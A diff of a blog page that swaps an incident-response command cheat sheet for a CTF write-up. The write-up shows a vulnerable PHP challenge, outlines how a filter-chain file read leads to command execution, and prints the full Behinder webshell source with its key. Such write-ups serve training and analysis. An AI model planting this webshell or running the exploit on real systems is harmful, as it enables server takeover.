@@ -18,49 +18,34 @@
   <meta name="author" content="lewiserii">
   <meta name="keywords" content="">
   
-    <meta name="description" content="应急响应应急响应流程 事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等 临时处置：给出客户临时处置建议，断网隔离，保护现场环境 信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析 清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件 产出报告：整理并输出完整的安全事件报告 linux重要文件和目录   文件名 说明    &#x2F;e">
+    <meta name="description" content="webbriefphp12345678910111213141516171819202122&lt;!--&lt;a href&#x3D;&quot;&#x2F;?source&quot;&gt;source&lt;&#x2F;a&gt;--&gt;&lt;?php if (isset($_GET[&amp;#x27;source&amp;#x27;])) highlight_file(__FILE__)  ?&gt;&lt;?php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="应急响应中的常用命令">
-<meta property="og:url" content="https://www.lewiserii.top/hw/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html">
+<meta property="og:title" content="2023台州市第三届网络安全大赛wp">
+<meta property="og:url" content="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html">
 <meta property="og:site_name" content="lewiserii&#39;s blog">
-<meta property="og:description" content="应急响应应急响应流程 事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等 临时处置：给出客户临时处置建议，断网隔离，保护现场环境 信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析 清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件 产出报告：整理并输出完整的安全事件报告 linux重要文件和目录   文件名 说明    &#x2F;e">
+<meta property="og:description" content="webbriefphp12345678910111213141516171819202122&lt;!--&lt;a href&#x3D;&quot;&#x2F;?source&quot;&gt;source&lt;&#x2F;a&gt;--&gt;&lt;?php if (isset($_GET[&amp;#x27;source&amp;#x27;])) highlight_file(__FILE__)  ?&gt;&lt;?php">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-2.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-3.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-4.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-5.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-6.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-7.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-8.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-9.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-10.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-11.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-12.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-13.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-14.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-15.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-16.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-17.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-18.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-19.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-20.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-21.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-22.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-23.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-24.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-25.png">
-<meta property="article:published_time" content="2023-07-18T05:00:00.000Z">
-<meta property="article:modified_time" content="2023-08-02T06:06:07.540Z">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png">
+<meta property="article:published_time" content="2023-09-27T06:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-13T16:14:31.726Z">
 <meta property="article:author" content="lewiserii">
-<meta property="article:tag" content="hw">
-<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="台州">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png">
+<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png">
   
   
   
-  <title>应急响应中的常用命令 - lewiserii&#39;s blog</title>
+  <title>2023台州市第三届网络安全大赛wp - lewiserii&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -236,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="应急响应中的常用命令"></span>
+            <span id="subtitle" data-typed-text="2023台州市第三届网络安全大赛wp"></span>
           
         </div>
 
@@ -252,8 +237,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-18 13:00" pubdate>
-          2023年7月18日 下午
+        <time datetime="2023-09-27 14:00" pubdate>
+          2023年9月27日 下午
         </time>
       </span>
     
@@ -264,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          3.6k 字
         
       </span>
     
@@ -275,7 +260,7 @@
         
         
         
-          31 分钟
+          36 分钟
         
       </span>
     
@@ -321,250 +306,57 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">应急响应中的常用命令</h1>
+            <h1 style="display: none">2023台州市第三届网络安全大赛wp</h1>
             
             <div class="markdown-body">
               
-              <h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p><strong>应急响应流程</strong></p>
-<p>事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等</p>
-<p>临时处置：给出客户临时处置建议，断网隔离，保护现场环境</p>
-<p>信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析</p>
-<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件</p>
-<p>产出报告：整理并输出完整的安全事件报告</p>
-<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="重要文件和目录"><a href="#重要文件和目录" class="headerlink" title="重要文件和目录"></a>重要文件和目录</h2><table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#x2F;etc&#x2F;passwd</td>
-<td>用户信息文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;crontab</td>
-<td>定时任务文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;anacrontab</td>
-<td>异步定时任务</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</td>
-<td>开机启动项</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;hosts</td>
-<td>本地IP地址域名解析文件</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
-<td>登录失败日志</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
-<td>包含用户登录日志</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
-<td>当前登陆系统的用户信息</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;cron</td>
-<td>定时任务执行日志</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
-<td>所有用户最近登录信息</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log&#x2F;secure</td>
-<td>验证，授权等日志</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>目录</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#x2F;root&#x2F;.ssh</td>
-<td>root用户ssh公钥和私钥</td>
-</tr>
-<tr>
-<td>&#x2F;tmp</td>
-<td>系统或用户临时文件的目录</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;init.d</td>
-<td>开机启动项</td>
-</tr>
-<tr>
-<td>&#x2F;var&#x2F;log</td>
-<td>日志默认存放目录</td>
-</tr>
-</tbody></table>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>查看当前目录下所有文件并排序<br><code>ls -alt</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png"></p>
-<p>查看系统内存使用情况<br><code>free -h</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-2.png"></p>
-<p>查看系统进程及子进程<br><code>ps auxf</code>、<code>top</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-4.png"></p>
-<p>查看网络连接<br><code>netstat -antpl</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-5.png"></p>
-<p>根据pid使用<code>ls -alh /proc/pid</code>命令查看对应的可执行程序</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-6.png"></p>
-<p>查询端口打开的文件<br><code>lsof -i:port</code></p>
-<p>查询进程打开的文件<br><code>lsof -p pid</code></p>
-<p>查询用户打开的文件<br><code>lsof -u root</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-7.png"></p>
-<p>修改文件属性<br><code>chattr</code></p>
-<p>显示文件属性<br><code>lsattr</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-8.png"></p>
-<p>排查启动项<br><code>cat /etc/rc.local</code><br><code>ls -alt /etc/profile.d/*.sh</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-9.png"></p>
-<p>查看所有用户的定时任务<br><code>cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</code><br><code>ls -altr /var/spool/cron/*</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-10.png"></p>
-<p>查看历史命令<br><code>history</code><br><code>cat ~/.bash_history</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-11.png"></p>
-<p>校验软件包<br><code>rpm -Va</code><br><code>dpkg --verify</code></p>
-<table>
-<thead>
-<tr>
-<th>值</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>S</td>
-<td>表示对应文件的大小不一致</td>
-</tr>
-<tr>
-<td>M</td>
-<td>表示对应文件权限和所有权不一样</td>
-</tr>
-<tr>
-<td>5</td>
-<td>表示对应文件的MD5不一致</td>
-</tr>
-<tr>
-<td>D</td>
-<td>表示文件的设备号和驱动程序不一致</td>
-</tr>
-<tr>
-<td>L</td>
-<td>表示文件的符号连接内容不一致</td>
-</tr>
-<tr>
-<td>U</td>
-<td>表示文件所有者不一致</td>
-</tr>
-<tr>
-<td>G</td>
-<td>表示文件群组不一致</td>
-</tr>
-<tr>
-<td>T</td>
-<td>表示文件的修改时间不一致</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>软件更新会导致大小或MD5不一致，同时出现SM5需要注意</p>
-</blockquote>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-12.png"></p>
-<p>查看文件（目录）详细信息<br><code>stat</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-13.png"></p>
-<p>查找当前目录下，指定天数内修改的指定类型文件<br><code>find / -mtime 0 -name *.jsp</code></p>
-<p>查找当前目录下，指定天数内新增的指定类型文件<br><code>find / -ctime 0 -name *.jsp</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-14.png"></p>
-<p>比较文件差异<br><code>diff -c</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-15.png"></p>
-<p>查找隐藏进程<br><code>ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.p</code><br><code>ls /proc |sort -n |uniq &gt; proc.p</code><br><code>diff ps.p proc.p</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-16.png"></p>
-<p>查看用户登录历史记录<br><code>last</code></p>
-<p>查看用户登录失败记录<br><code>lastb</code></p>
-<p>查看用户最近一次登录信息<br><code>lastlog</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-17.png"></p>
-<p>登录成功的IP<br><code>grep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
-<p>定位有爆破行为的IP<br><code>grep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-18.png"></p>
-<p>查找每个IP地址的失败登录次数：<br><code>awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-19.png"></p>
-<p>查找特定IP地址的失败登录：<br><code>grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-20.png"></p>
-<p>查找特定IP地址的成功登录：<br><code>grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-21.png"></p>
-<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Linux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志<br><br>内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置<br>用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等<br>应用日志：记录应用程序运行过程中的各种事件信息<br></code></pre></td></tr></table></figure>
+              <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="briefphp"><a href="#briefphp" class="headerlink" title="briefphp"></a>briefphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--&lt;a href=<span class="hljs-string">&quot;/?source&quot;</span>&gt;source&lt;/a&gt;--&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)  <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;!DOCTYPE&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> nothing here<br></code></pre></td></tr></table></figure>
 
-<p>可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）<br>也可以使用第三方的分析工具，比如LogForensics，星图等等</p>
-<h2 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h2><p><strong>busybox</strong></p>
-<p>集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用</p>
-<p>官网：<a target="_blank" rel="noopener" href="https://busybox.net/">https://busybox.net/</a></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-22.png"></p>
-<p><strong>unhide</strong></p>
-<p>检测发现借助rootkit及其他技术隐藏的进程和TCP&#x2F;UDP端口的命令行工具</p>
-<p><code>yum -y install unhide</code>安装或者在<a target="_blank" rel="noopener" href="https://www.unhide-forensics.info/">官网下载</a></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-23.png"></p>
-<p><strong>chkrootkit</strong></p>
-<p>linux下检测rootkit的脚本</p>
-<p>ubuntu系列安装命令：<code>apt install chkrootkit</code><br>centos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，<a target="_blank" rel="noopener" href="https://www.chkrootkit.org/">官网</a></p>
-<p>直接运行后查找infected关键字即可</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-24.png"></p>
-<p><strong>clamav</strong></p>
-<p>检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-25.png"></p>
-<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>regedit</td>
-<td>注册表</td>
-</tr>
-<tr>
-<td>taskmgr</td>
-<td>任务管理器</td>
-</tr>
-<tr>
-<td>msconfig</td>
-<td>系统配置</td>
-</tr>
-<tr>
-<td>eventvwr</td>
-<td>事件查看器</td>
-</tr>
-<tr>
-<td>compmgmt.msc</td>
-<td>计算机管理</td>
-</tr>
-<tr>
-<td>gpedit.msc</td>
-<td>本地组策略</td>
-</tr>
-<tr>
-<td>taskschd.msc</td>
-<td>计划任务</td>
-</tr>
-<tr>
-<td>lusrmgr.msc</td>
-<td>本地用户和组</td>
-</tr>
-</tbody></table>
-<p>查看网络连接<br><code>netstat -ano</code></p>
-<p>操作系统的详细配置信息<br><code>systeminfo</code></p>
-<p>获取系统进程信息<br><code>wmic process</code></p>
-<p>根据应用程序查找PID<br><code>wmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name</code></p>
-<p>根据PID查找应用程序<br><code>wmic process where processid=&quot;9096&quot; get executablepath,name</code></p>
-<p>获取系统进程信息<br><code>tasklist</code></p>
-<p>对于要查询特定dll的调用情况，可以使用<br><code>tasklist /d dll名称</code></p>
-<p>计算样本MD5<br><code>certutil -hashfile %样本exe% md5</code></p>
+<p>只能读取以<code>&lt;!DOCTYPE</code>开头的文件，直接用<code>php_filter_chain_generator</code>构造</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png"></p>
+<p>读取shell.php</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png"></p>
+<p>然后文件包含转命令执行</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png"></p>
+<p>蚁剑连接拿到flag</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="这是神马"><a href="#这是神马" class="headerlink" title="这是神马"></a>这是神马</h2><p>流量分析，导出http对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>	<span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;144a6b2296333602&quot;</span>;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>	<span class="hljs-title function_ invoke__">session_write_close</span>();<br>	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    			 <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>	&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
+<p>拿到key后解密冰蝎流量</p>
+<p>其中一条流量中发现命令<code>cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png"></p>
+<p>生成<code>openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png"></p>
+<p>解压得到<br><code>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 </code></p>
+<p>使用<code>th1sisKey</code>密钥解emoji-aes得到flag</p>
+<h2 id="李先生的计算机"><a href="#李先生的计算机" class="headerlink" title="李先生的计算机"></a>李先生的计算机</h2><p><code>2.ad1</code>文件，使用FTK Imager挂载</p>
+<p>根据提示直接找邮件存储位置<code>MailMasterData</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png"></p>
+<p>拿到search.db文件，用db browser查看</p>
+<p>得到转账金额<code>600</code>和附件密码<code>dbt_1126_tta</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png"></p>
+<p>jpg加密软件密码<code>123654</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png"></p>
+<p>附件可以在<code>MailMasterData</code>下或<code>download</code>目录下找到</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png"></p>
+<p>解压后得到<code>BorromeanIslands.jpg</code>，jphs解密后得到银行卡号<code>6222025567723373838</code></p>
+<p><code>DASCTF&#123;600_6222025567723373838&#125;</code></p>
